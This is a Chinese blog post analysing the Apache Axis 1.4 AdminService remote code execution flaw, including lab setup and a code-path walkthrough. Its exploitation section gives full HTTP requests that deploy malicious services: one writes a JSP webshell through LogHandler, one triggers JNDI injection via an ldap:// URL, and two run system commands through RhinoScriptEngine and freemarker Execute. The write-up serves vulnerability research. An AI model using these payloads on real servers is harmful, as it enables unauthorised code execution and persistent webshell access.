title: Apache Axis1.4 RCE 漏洞分析
author: Bmth
tags:
  - Axis
top_img: 'https://img-blog.csdnimg.cn/20f7ed34a6514d968a074bdd06f78044.png'
cover: 'https://img-blog.csdnimg.cn/20f7ed34a6514d968a074bdd06f78044.png'
categories:
  - java
date: 2023-11-28 20:37:00
---
![](https://img-blog.csdnimg.cn/20f7ed34a6514d968a074bdd06f78044.png)

最近出现了很多xxe打本地axis服务的利用方式，这里就分析一下axis1.4漏洞起因以及利用技巧

## 环境搭建
安装教程：[intellij idea 下用java Apache axis 创建WebService 服务端 过程](https://www.cnblogs.com/felordcn/p/12142601.html)

这里我的环境版本如下：
```
jdk1.7.0_80
Tomcat-6.0.28
Apache Axis1.4
```

使用idea进行搭建，选择Java EE->Web应用程序->Web服务
![](https://img-blog.csdnimg.cn/5ab015bd35874b83bb6b048a196e7bd9.png)

然后打开项目结构，发现Problems有错误，点击Fix选择Add就行了，即需要将库添加到工件当中
![](https://img-blog.csdnimg.cn/c76e85b9c412456b9c342ea87872c2e2.png)

由于idea会自动帮我们生成好server-config.wsdd配置文件和web.xml中的servlet，所以直接启动即可
![](https://img-blog.csdnimg.cn/66d5012223cc43cb8081782dadbad880.png)

axis官方文档：[https://axis.apache.org/axis/java/](https://axis.apache.org/axis/java/)
SOAP语法：[https://www.w3school.com.cn/soap/soap_syntax.asp](https://www.w3school.com.cn/soap/soap_syntax.asp)

`enableRemoteAdmin`的值默认为false，改成true则会开启远程调用：[https://axis.apache.org/axis/java/user-guide.html#Remote_Administration](https://axis.apache.org/axis/java/user-guide.html#Remote_Administration)
![](https://img-blog.csdnimg.cn/e17cd784913f440984e5558bead6ba69.png)

## 漏洞分析
该漏洞主要是通过`/services/AdminService`接口来新建服务导致恶意代码执行

### 流程解析
流程比较复杂，具体可以看 nice_0e3 师傅的文章，这里就简单看看

`org.apache.axis.transport.http.AxisServlet#doPost`
![](https://img-blog.csdnimg.cn/9adeaaed1bc741d1b2196b5e1a0c6bfb.png)

在POST传参的时候会调用 getSoapAction 方法
![](https://img-blog.csdnimg.cn/f146a4d410ed4b27a3dea7a93fd67d13.png)

这里需要存在Header头`SOAPAction`，否则直接`throw af`抛出异常了

`org.apache.axis.transport.http.AxisServlet#doGet`
![](https://img-blog.csdnimg.cn/57c23fe80c2a4310bdc0ac2160de8732.png)

跟进 processQuery 方法
![](https://img-blog.csdnimg.cn/0927c972bd5c4aec8137eff84291bf2f.png)

调用`org.apache.axis.transport.http.QSMethodHandler#invoke`
![](https://img-blog.csdnimg.cn/ec1dd32b2eea4c83a51ec0119663aa5e.png)

即调用 invokeEndpointFromGet 方法处理参数：
```java
        while(e.hasMoreElements()) {
            String param = (String)e.nextElement();
            if (param.equalsIgnoreCase("method")) {
                method = request.getParameter(param);
            } else {
                args = args + "<" + param + ">" + request.getParameter(param) + "</" + param + ">";
            }
        }

        if (method == null) {
            response.setContentType("text/html");
            response.setStatus(400);
            writer.println("<h2>" + Messages.getMessage("error00") + ":  " + Messages.getMessage("invokeGet00") + "</h2>");
            writer.println("<p>" + Messages.getMessage("noMethod01") + "</p>");
        } else {
            this.invokeEndpointFromGet(msgContext, response, writer, method, args);
        }

    }

    private void invokeEndpointFromGet(MessageContext msgContext, HttpServletResponse response, PrintWriter writer, String method, String args) throws AxisFault {
        String body = "<" + method + ">" + args + "</" + method + ">";
        String msgtxt = "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP-ENV:Body>" + body + "</SOAP-ENV:Body>" + "</SOAP-ENV:Envelope>";
        ByteArrayInputStream istream = new ByteArrayInputStream(msgtxt.getBytes());
        Message responseMsg = null;
```
![](https://img-blog.csdnimg.cn/f813fce911b3480981c49b8ac7e2179b.png)

会在method前后加上尖括号，然后放到SOAP标签内，那么我们就需要进行闭合，使用`<!-->`作为前缀，这是 XML 注释的开头， `</!-->`为注释的结尾，因此，第一行被忽略，我们的payload就只会解析一次了

### AdminService接口调用
看到`org.apache.axis.utils.Admin#AdminService`
![](https://img-blog.csdnimg.cn/e1da436c9a0e43618e704d5dad4ff776.png)

调用`this.process`方法，跟进
![](https://img-blog.csdnimg.cn/13b8a194e8c845b7bb877329f4ab6a09.png)

调用 verifyHostAllowed 方法对 ip 进行检验，需要满足 enableRemoteAdmin 为true，如果不满足那么需要 remoteIP 为`127.0.0.1`或者`0:0:0:0:0:0:0:1`，如果都不是则直接 throw 抛出异常
```java
if (rootNS != null && rootNS.equals("http://xml.apache.org/axis/wsdd/")) {
            return processWSDD(msgContext, engine, root);
        }
```
接下来进入到 processWSDD 方法
![](https://img-blog.csdnimg.cn/f019f9e95b0a48a9aaf92a457d42a481.png)

`org.apache.axis.AxisEngine#saveConfiguration`，写入配置文件
![](https://img-blog.csdnimg.cn/b75f1ac8e6784339a66dc324eed59677.png)

`org.apache.axis.configuration.FileProvider#writeEngineConfig`
![](https://img-blog.csdnimg.cn/abc395381bfd41e281bce1658e89aca0.png)

即会将xml数据写入到`server-config.wsdd`配置文件里面，造成漏洞



## 漏洞利用
利用方式有以下两种：
- 暴露在外部的web service能直接调用造成危害，web service通常会存在较多的漏洞问题，很多时候没鉴权或者鉴权不够
- 利用AdminService部署恶意类service或者handler，但是AdminService只能local访问，需要配合一个SSRF

实际上大多数情况都是第二种，需要利用XXE、SSRF或者中间人攻击，通过get请求来部署恶意服务

而类作为service也是需要条件的：
- 需要有一个 public 的无参构造函数
- 只有public的方法会作为service方法，并且不包含父类的方法


官网配置文档：[https://axis.apache.org/axis/java/reference.html](https://axis.apache.org/axis/java/reference.html)
![](https://img-blog.csdnimg.cn/cad982c0152e496bb2f007d1dab8f4a5.png)

allowedMethods字段指定调用的方法、className字段指定实现的类名

### org.apache.axis.handlers.LogHandler
LogHandler：它将每次的请求和响应记录到文件中
我们可以更改默认配置文件名`LogHandler.fileName`，然后通过日志文件写入webshell
![](https://img-blog.csdnimg.cn/9a668be9a2234f559ceb997571257380.png)

POST请求：
```xml
POST /axis/services/AdminService HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 785

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
  <soap:Body>
    <deployment
      xmlns="http://xml.apache.org/axis/wsdd/"
      xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
        <service name="randomAAA" provider="java:RPC">
        <requestFlow>
            <handler type="java:org.apache.axis.handlers.LogHandler" >
                <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
                <parameter name="LogHandler.writeToConsole" value="false" />
            </handler>
        </requestFlow>
          <parameter name="className" value="java.util.Random" />
          <parameter name="allowedMethods" value="*" />
        </service>
    </deployment>
  </soap:Body>
</soap:Envelope>
```
GET请求：
```
GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomBBB%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fshell.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
Host: 127.0.0.1:8080
```
通过get或post请求部署完成后，可以看到配置文件已经被改变了
![](https://img-blog.csdnimg.cn/65fb90836a844d33a46bdbed77eaccb8.png)

第二步访问刚才部署的service，请求内容包含webshell
```xml
POST /axis/services/randomBBB HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 700

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.java">
   <soapenv:Header/>
   <soapenv:Body>
      <util:ints soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <in0 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance"><![CDATA[
<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); %>
]]></in0>
         <in1 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance">?</in1>
      </util:ints>
   </soapenv:Body>
</soapenv:Envelope>
```
成功写入`../webapps/ROOT/shell.jsp`
![](https://img-blog.csdnimg.cn/4f5c513276da48119248a5002a8de173.png)

>缺陷：只有写入jsp文件时，并且目标服务器解析jsp文件时才有用，例如不让解析jsp但是解析jspx文件时，因为log中有其他垃圾信息，jspx会解析错误，所以写入jspx也是没用的

### org.apache.axis.client.ServiceFactory
很明显的JNDI注入
![](https://img-blog.csdnimg.cn/7086a5eaadf74075b58a23622aea1b11.png)

POST请求：
```xml
POST /axis/services/AdminService HTTP/1.1
Host: 127.0.0.1:8080
SOAPAction: ""
Content-Type: application/xml; charset=utf-8
Content-Length: 755

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:api="http://127.0.0.1/Integrics/Enswitch/API" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soapenv:Body>
    <ns1:deployment xmlns:ns1="http://xml.apache.org/axis/wsdd/" xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
      <ns1:service name="ServiceFactoryService" provider="java:RPC">
        <ns1:parameter name="className" value="org.apache.axis.client.ServiceFactory"/>
        <ns1:parameter name="allowedMethods" value="*"/>
      </ns1:service>
    </ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>
```
GET请求：
```
GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
Host: 127.0.0.1:8080
```
通过get或post请求部署完成后，访问刚才部署的service并调用它的getService方法，传入jndi链接即可：
```xml
POST /axis/services/ServiceFactoryService HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 759

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:buil="http://build.antlr">
  <soapenv:Header/>
  <soapenv:Body>
    <buil:getService soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <environment xmlns:apachesoap="http://xml.apache.org/xml-soap" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xsi:type="apachesoap:Map">
        <item>
          <key xsi:type="soapenc:string">jndiName</key>
          <value xsi:type="soapenc:string">ldap://127.0.0.1:1389/Basic/Command/calc</value>
        </item>
      </environment>
    </buil:getService>
  </soapenv:Body>
</soapenv:Envelope>
```
>缺陷：如果设置了不允许远程加载JNDI Factory，就不能用了

### com.sun.script.javascript.RhinoScriptEngine
JDK<=7才存在的类，用来解析javascript
![](https://img-blog.csdnimg.cn/cb69a64c0aaa476198f33813340b842d.png)

POST请求：
```xml
POST /axis/services/AdminService HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 917

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
  <soap:Body>
    <deployment
      xmlns="http://xml.apache.org/axis/wsdd/"
      xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
        <service name="RhinoScriptEngineService" provider="java:RPC">
          <parameter name="className" value="com.sun.script.javascript.RhinoScriptEngine" />
          <parameter name="allowedMethods" value="eval" />
          <typeMapping deserializer="org.apache.axis.encoding.ser.BeanDeserializerFactory"
                     type="java:javax.script.SimpleScriptContext"
                     qname="ns:SimpleScriptContext"
                     serializer="org.apache.axis.encoding.ser.BeanSerializerFactory"
                     xmlns:ns="urn:beanservice" regenerateElement="false">
          </typeMapping>
        </service>
    </deployment>
  </soap:Body>
</soap:Envelope>
```
GET请求：
```
GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
Host: 127.0.0.1:8080
```
通过get或post请求部署完成后，访问刚才部署的service并调用它的eval方法，还可以回显：
```xml
POST /axis/services/RhinoScriptEngineService HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 702

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
  <soapenv:Body>
    <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
     <arg0 xmlns="">
     <![CDATA[function test(){var pb = new java.lang.ProcessBuilder('cmd.exe','/c','whoami');var process = pb.start();var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next();return ret;}test();]]>
     </arg0>
     <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
     </arg1>
    </eval>
  </soapenv:Body>
</soapenv:Envelope>
```
![](https://img-blog.csdnimg.cn/bc4a5083deeb490e9f5ae8afd667af93.png)


>缺陷： jdk7及之前的版本可以用，之后的版本就不是这个ScriptEngine类了，取代他的是NashornScriptEngine，但是这个NashornScriptEngine不能利用


### freemarker.template.utility.Execute
需要添加依赖，下载：[https://www.apache.org/dyn/closer.cgi/freemarker/engine/2.3.32/binaries/apache-freemarker-2.3.32-bin.tar.gz](https://www.apache.org/dyn/closer.cgi/freemarker/engine/2.3.32/binaries/apache-freemarker-2.3.32-bin.tar.gz)，导入freemarker-2.3.32.jar

看到exec方法，很明显的命令执行
![](https://img-blog.csdnimg.cn/dd93c384bf7c4d1f95cd395c96f86345.png)

POST请求
```xml
POST /services/AdminService HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 627

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body>
    <deployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
       <service name="freemarkerTest" provider="java:RPC">
        <parameter name="className" value="freemarker.template.utility.Execute"/>
        <parameter name="allowedMethods" value="*"/>
       </service>
    </deployment>
  </soapenv:Body>
</soapenv:Envelope>
```
GET请求：
```
GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22freemarkerTest%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22freemarker.template.utility.Execute%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
Host: 127.0.0.1:8080
```
调用service命令执行：
```xml
POST /axis/services/freemarkerTest HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Content-Length: 587

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
   <soapenv:Header/>
   <soapenv:Body>
      <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <arguments>
            <string xsi:type="soapenc:string">cmd.exe /c whoami</string>
         </arguments>
      </util:exec>
   </soapenv:Body>
</soapenv:Envelope>
```
![](https://img-blog.csdnimg.cn/b42c0428d193484ea466fade95e6d2fb.png)



参考：
[Oracle PeopleSoft Remote Code Execution: Blind XXE to SYSTEM Shell](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)
[Apache Axis1（<=1.4版本） RCE](https://xz.aliyun.com/t/5513)
[Apache Axis1 与 Axis2 WebService 的漏洞利用总结](https://paper.seebug.org/1489/)
[axis 1.4 AdminService未授权访问 jndi注入利用](https://xz.aliyun.com/t/7981)
[Java安全之Axis漏洞分析](https://www.cnblogs.com/nice0e3/p/15605781.html)
